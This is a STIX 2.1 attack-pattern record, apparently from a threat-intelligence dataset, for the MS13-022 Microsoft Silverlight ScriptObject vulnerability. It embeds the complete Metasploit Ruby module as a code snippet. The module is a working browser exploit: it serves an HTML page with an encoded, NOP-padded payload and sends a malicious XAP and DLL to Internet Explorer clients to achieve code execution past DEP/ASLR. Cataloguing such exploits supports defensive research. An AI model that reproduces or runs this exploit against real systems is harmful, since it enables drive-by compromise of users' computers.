{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7d947fd2-1f23-40ec-ba25-0096f48c59a9",
    "created": "2024-08-14T16:41:35.960077Z",
    "modified": "2024-08-14T16:41:35.960081Z",
    "name": "\"MS13-022 Microsoft Silverlight ScriptObject Unsafe Memory Access\"",
    "description": " This module exploits a vulnerability in Microsoft Silverlight. The vulnerability exists on the Initialize() method from System.Windows.Browser.ScriptObject, which access memory in an unsafe manner. Since it is accessible for untrusted code (user controlled) it's possible to dereference arbitrary memory which easily leverages to arbitrary code execution. In order to bypass DEP/ASLR a second vulnerability is used, in the public WriteableBitmap class from System.Windows.dll. This module has been tested successfully on IE6 - IE10, Windows XP SP3 / Windows 7 SP1.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms13_022_silverlight_script_object.rb",
            "external_id": "ms13_022_silverlight_script_object.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-0074"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-3896"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::BrowserExploitServer\n\n  MANIFEST = <<-EOS\n<Deployment xmlns=\"http://schemas.microsoft.com/client/2007/deployment\" xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" EntryPointAssembly=\"SilverApp1\" EntryPointType=\"SilverApp1.App\" RuntimeVersion=\"4.0.50826.0\">\n  <Deployment.Parts>\n    <AssemblyPart x:Name=\"SilverApp1\" Source=\"SilverApp1.dll\" />\n  </Deployment.Parts>\n</Deployment>\n  EOS\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"MS13-022 Microsoft Silverlight ScriptObject Unsafe Memory Access\",\n      'Description'    => %q{\n        This module exploits a vulnerability in Microsoft Silverlight. The vulnerability exists on\n        the Initialize() method from System.Windows.Browser.ScriptObject, which access memory in an\n        unsafe manner. Since it is accessible for untrusted code (user controlled) it's possible\n        to dereference arbitrary memory which easily leverages to arbitrary code execution. In order\n        to bypass DEP/ASLR a second vulnerability is used, in the public WriteableBitmap class\n        from System.Windows.dll. This module has been tested successfully on IE6 - IE10, Windows XP\n        SP3 / Windows 7 SP1.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'James Forshaw',   # RCE Vulnerability discovery\n          'Vitaliy Toropov', # Info Leak discovery, original exploit, all the hard work\n          'juan vazquez'     # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2013-0074' ],\n          [ 'CVE', '2013-3896' ],\n          [ 'OSVDB', '91147' ],\n          [ 'OSVDB', '98223' ],\n          [ 'BID', '58327' ],\n          [ 'BID', '62793' ],\n          [ 'MSB', 'MS13-022' ],\n          [ 'MSB', 'MS13-087' ],\n          [ 'PACKETSTORM', '123731' ]\n        ],\n      'DefaultOptions'  =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n          'EXITFUNC'             => 'thread'\n        },\n      'Platform'       => 'win',\n      'Arch'           => ARCH_X86,\n      'BrowserRequirements' =>\n        {\n          :source      => /script|headers/i,\n          :os_name     => OperatingSystems::Match::WINDOWS,\n          :ua_name     => Msf::HttpClients::IE,\n          :silverlight => \"true\"\n        },\n      'Targets'        =>\n        [\n          [ 'Windows x86/x64', {} ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-03-12',\n      'DefaultTarget'  => 0))\n\n  end\n\n  def setup\n    @xap_name = \"#{rand_text_alpha(5 + rand(5))}.xap\"\n    @dll_name = \"#{rand_text_alpha(5 + rand(5))}.dll\"\n    File.open(File.join( Msf::Config.data_directory, \"exploits\", \"cve-2013-0074\", \"SilverApp1.xap\" ), \"rb\") { |f| @xap = f.read }\n    File.open(File.join( Msf::Config.data_directory, \"exploits\", \"cve-2013-0074\", \"SilverApp1.dll\" ), \"rb\") { |f| @dll = f.read }\n    @xaml = MANIFEST.gsub(/SilverApp1\\.dll/, @dll_name)\n    super\n  end\n\n  def exploit_template(cli, target_info)\n\n    my_payload = get_payload(cli, target_info)\n\n    # Align to 4 bytes the x86 payload\n    while my_payload.length % 4 != 0\n      my_payload = \"\\x90\" + my_payload\n    end\n\n    my_payload = Rex::Text.encode_base64(my_payload)\n\n    html_template = <<-EOF\n<html>\n<!-- saved from url=(0014)about:internet -->\n<head>\n  <title>Silverlight Application</title>\n  <style type=\"text/css\">\n    html, body { height: 100%; overflow: auto; }\n    body { padding: 0; margin: 0; }\n    #form1 { height: 99%; }\n    #silverlightControlHost { text-align:center; }\n  </style>\n</head>\n<body>\n  <form id=\"form1\" runat=\"server\" >\n    <div id=\"silverlightControlHost\">\n    <object data=\"data:application/x-silverlight-2,\" type=\"application/x-silverlight-2\" width=\"100%\" height=\"100%\">\n      <param name=\"source\" value=\"<%= @xap_name %>\"/>\n      <param name=\"background\" value=\"white\" />\n      <param name=\"InitParams\" value=\"payload=<%= my_payload %>\" />\n    </object>\n    </div>\n  </form>\n</body>\n</html>\nEOF\n\n    return html_template, binding()\n  end\n\n  def on_request_exploit(cli, request, target_info)\n    print_status(\"request: #{request.uri}\")\n    if request.uri =~ /#{@xap_name}$/\n      print_status(\"Sending XAP...\")\n      send_response(cli, @xap, { 'Content-Type' => 'application/x-silverlight-2', 'Pragma' => 'no-cache', 'Cache-Control' => 'no-cache' })\n    elsif request.uri =~ /#{@dll_name}$/\n      print_status(\"Sending DLL...\")\n      send_response(cli, @dll, { 'Content-Type' => 'application/octect-stream', 'Pragma' => 'no-cache', 'Cache-Control' => 'no-cache' })\n    elsif request.uri =~ /AppManifest.xaml$/\n      print_status(\"Sending XAML...\")\n      send_response(cli, @xaml, { 'Content-Type' => 'text/xaml', 'Pragma' => 'no-cache', 'Cache-Control' => 'no-cache' })\n    else\n      print_status(\"Sending HTML...\")\n      send_exploit_html(cli, exploit_template(cli, target_info))\n    end\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2013-03-12",
    "x_mitre_platforms": [
        "win'"
    ]
}